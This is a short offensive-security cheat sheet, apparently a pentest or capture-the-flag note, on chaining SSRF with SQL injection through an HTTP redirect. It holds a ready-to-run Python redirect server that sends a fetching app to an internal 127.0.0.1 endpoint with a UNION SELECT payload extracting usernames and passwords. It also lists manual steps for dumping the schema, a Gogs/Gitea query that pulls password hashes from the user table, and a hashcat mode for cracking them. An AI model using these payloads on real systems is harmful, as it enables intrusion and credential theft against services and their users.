# SSRF-Assisted SQL Injection via HTTP Redirect

When an app fetches a user-supplied URL (webhook, health-check, URL preview) and follows redirects, you can redirect through your server to an internal service, injecting SQL into the final destination URL.

## Attack flow

```
Attacker submits URL: http://<LHOST>/redirect
App fetches http://<LHOST>/redirect → your server returns 302 → http://127.0.0.1:8000/api?q=<SQL_PAYLOAD>
App sends second request to 127.0.0.1:8000 with injected SQL
```

## Setup redirect server (Python)

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

PAYLOAD = "1 UNION SELECT 1,username,password,4 FROM users-- -"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location',
            f'http://127.0.0.1:8000/api?id={urllib.parse.quote(PAYLOAD)}')
        self.end_headers()

HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
```

## Why sqlmap doesn't work

sqlmap can't follow the redirect chain back through the SSRF. Manual exploitation is required:
1. Determine number of columns (ORDER BY binary search or UNION SELECT NULLs)
2. Find data-reflecting column
3. Extract schema: `UNION SELECT table_name,2,3 FROM information_schema.tables-- -`
4. Dump target table

## SQLite variant (Gogs/Gitea)

```sql
-- Gogs uses SQLite; query user table:
1 UNION SELECT 1,name,passwd,4 FROM user-- -
-- passwd is bcrypt; crack with hashcat -m 3200
```
